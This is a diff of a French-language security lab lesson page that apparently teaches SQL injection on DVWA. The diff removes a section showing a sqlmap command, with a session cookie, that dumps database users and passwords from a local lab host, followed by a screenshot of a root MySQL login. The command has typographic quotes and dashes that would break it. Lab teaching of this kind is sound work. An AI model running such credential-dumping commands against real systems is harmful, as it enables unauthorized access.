@@ -2499,17 +2499,6 @@
 <p><img alt="20-sqlmap-reponses-passwords" src="../../images/2020/07/20-sqlmap-reponses-passwords.png" /></p>
 <p>Résultat :  </p>
 <p><img alt="20-sqlmap-users-table" src="../../images/2020/07/20-sqlmap-users-table.png" /></p>
-<p>Pour extraire les utilisateurs de la DBMS :  </p>
-<div class="highlight"><pre><span></span><code>sqlmap -u &quot;http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
-  --cookie=&quot;security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3&quot; \  
-  --string=”Surname” –users –password
-</code></pre></div>
-<p>Résultat :  </p>
-<p><img alt="20-sqlmap-dbms-users" src="../../images/2020/07/20-sqlmap-dbms-users.png" /></p>
-<p>On peut voir que les champs de mot de passe sont NULL, ce qui veut dire qu'il n'y a pas de mot de passe pour les utilisateurs...</p>
-<p>Testons-le en se connectant à mysql :  </p>
-<p><img alt="20-mysql-login-root" src="../../images/2020/07/20-mysql-login-root.png" /></p>
-<p>Et voilà!</p>
 <div class="admonition important">
 <p class="admonition-title">Important</p>
 <p>Prenez quelques minutes pour faire votre <a href="../../outils/cartographie/">cartographie</a> de la leçon d'aujourd'hui!   </p>
